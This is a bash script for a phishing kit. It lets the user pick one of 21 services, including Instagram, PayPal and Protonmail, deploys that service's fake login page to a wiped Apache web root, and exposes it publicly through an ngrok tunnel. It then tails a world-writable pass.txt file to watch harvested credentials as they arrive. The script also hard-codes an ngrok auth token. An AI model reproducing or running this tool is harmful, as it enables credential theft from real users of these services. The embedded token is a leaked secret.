#!/bin/bash

clear
tput setaf 11


icon="⠀⠀⠀⠀⠀⠀⠀ ⣠⣄⣀⣀⠄
⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣷
⠀⠀⠀⠀⠀⠀⠀⠠⣻⣿⡿⠃⠀⠀⠀⠀⠀⢀⠠⠄⠐⠂
⠀⠀⠀⠀⠀⠀⠀⣼⣿⣿⠀⠀⡀⡀⠄⠒⠉
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⣦⠾⠟
⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣧⣄⡀
⣶⣶⣶⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀
⠀⠉⠁⠀⠀⢸⣿⣿⡏⠉⠉⠉⠉⣿⣿⠃
⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⠀⢸⣿⣿⡇⠀⠀⠀⠀⣸⣿⡄
⠀⠀⠀⠀⠀⣼⣿⣿⡇⠀⠀⠀⠀⠙⢿⣧
⠀⠀⠀⠀⠀⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠁⠀⠀⠀⠀⠘⠃
⠀⠀⠀⠀⠀⠛⠛⠛
----------------------------------------"
menu="      
[1] Instagram   [10] Spotify    [19] Pubg
[2] Discord     [11] Twitch     [20] Yahoo
[3] LinkedIn    [12] Tiktok     [21] Yandex
[4] Google      [13] Steam
[5] Facebook    [14] Roblox
[6] Snapchat    [15] Wordpress
[7] Netflix     [16] Paypal
[8] Pinterest   [17] Protonmail
[9] Reddit      [18] Valorant
                
                [99]Exit
                "

echo -e "$icon"
echo -e "$menu"
read -p "Choose an option:" choice


#------------------------------------------------------------------------
# Functions

#Delete-Copy-Permission-Apache-NgrokAuthKey-SetMenu Function
basicSettings() {
    
    sudo rm -rf /var/www/html/*
    sudo cp -r $1 /var/www/html/
    sudo chmod 777 /var/www/html/pass.txt
    sudo systemctl start apache2 &
    ngrok config add-authtoken 2u9oXgeX6j8I0lhMA8WXxcRahLf_4mqMA3UbuV81RGZ4H9pqP
    clear
    echo -e "$icon"
    echo "Wait patiently for the fish to be hooked..."



}

startNgrok() {

    ngrok http 80 > /dev/null 2>&1 &
    sleep 5 
    url=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
    echo "Link: $url"
    printf "Results:\n-------------------\n"
    sudo tail -f /var/www/html/pass.txt

}

#------------------------------------------------------------------------
# Switch-Case


case $choice in
    1)  
    basicSettings "scripts/instagram/*"
    startNgrok
    ;;    
    2)
    basicSettings "scripts/discord/*"
    startNgrok    
    ;;
    3)
    basicSettings "scripts/linkedin/*"
    startNgrok
    ;;
    4)
    basicSettings "scripts/google/*"
    startNgrok
    ;;
    5)
    basicSettings "scripts/facebook/*"
    startNgrok
    ;;
    6)
    basicSettings "scripts/snapchat/*"
    startNgrok
    ;;
    7)
    basicSettings "scripts/netflix/*"
    startNgrok
    ;;
    8)
    basicSettings "scripts/pinterest/*"
    startNgrok
    ;;
    9)
    basicSettings "scripts/reddit/*"
    startNgrok
    ;;
    10)
    basicSettings "scripts/spotify/*"
    startNgrok
    ;;
    11)
    basicSettings "scripts/twitch/*"
    startNgrok
    ;;
    12)
    basicSettings "scripts/tiktok/*"
    startNgrok
    ;;
    13)
    basicSettings "scripts/steam/*"
    startNgrok
    ;;
    14)
    basicSettings "scripts/roblox/*"
    startNgrok
    ;;
    15)
    basicSettings "scripts/wordpress/*"
    startNgrok
    ;;
    16)
    basicSettings "scripts/paypal/*"
    startNgrok
    ;;
    17)
    basicSettings "scripts/protonmail/*"
    startNgrok
    ;;
    18)
    basicSettings "scripts/valorant/*"
    startNgrok
    ;;
    19)
    basicSettings "scripts/pubg/*"
    startNgrok
    ;;
    20)
    basicSettings "scripts/yahoo/*"
    startNgrok
    ;;
    21)
    basicSettings "scripts/yandex/*"
    startNgrok
    ;;
    99)
    exit
    ;;
    *)
        echo "An error occured!"
        exit
    ;;
esac